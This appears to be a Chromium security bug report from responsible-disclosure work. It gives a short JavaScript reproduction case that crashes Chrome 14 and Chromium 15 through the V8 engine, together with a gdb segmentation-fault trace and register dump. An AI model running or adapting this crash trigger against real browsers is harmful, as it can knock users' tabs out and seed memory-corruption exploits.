<b>VULNERABILITY DETAILS</b>
The javascript code below crashes Chrome 14 stable and Chromium 15 as well as the corresponding V8 shells. The crash has a very similar signature to issue #95485 but it does not contain "finally".

<b>VERSION</b>
Chrome Version: 14.0.835.163 stable
Operating System: Ubuntu Linux 11.04

<b>REPRODUCTION CASE</b>

while (true) {
    function test(length) {
      for (var i = 0; i < length; i++) {
        var c = Math.round( false | input ^ this, __lookupGetter__);
      }
      const isFinite = this, input;   
    }
    for (var i = 1; i <= 128; i <<= 1); {
      for (var j = 0; j < 8; j++) {
        for (var k = 0; k < 3; k++) {
          test(i + j);
        }
      }
    }
}


<b>FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION</b>
Type of crash: tab
Crash State (gdb trace from optimized browser build):

Program received signal SIGSEGV, Segmentation fault.
0x00f963cf in ?? ()
(gdb) bt
#0  0x00f963cf in ?? ()
(gdb) x /4i $eip
=> 0xf963cf:    mov    (%eax),%eax
   0xf963d1:    and    $0xffffe000,%eax
   0xf963d6:    mov    0x14(%eax),%eax
   0xf963d9:    mov    %eax,0x1c(%esp)
(gdb) print $eax
$1 = -1
(gdb) info registers
eax            0xffffffff       -1
ecx            0x1      1
edx            0x82     130
ebx            0x3422ff4        54669300
esp            0xbfffd2a0       0xbfffd2a0
ebp            0x0      0x0
esi            0xbfffd36c       -1073753236
edi            0x3967f5dd       963114461
eip            0xf963cf 0xf963cf
eflags         0x210246 [ PF ZF IF RF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
(gdb) 

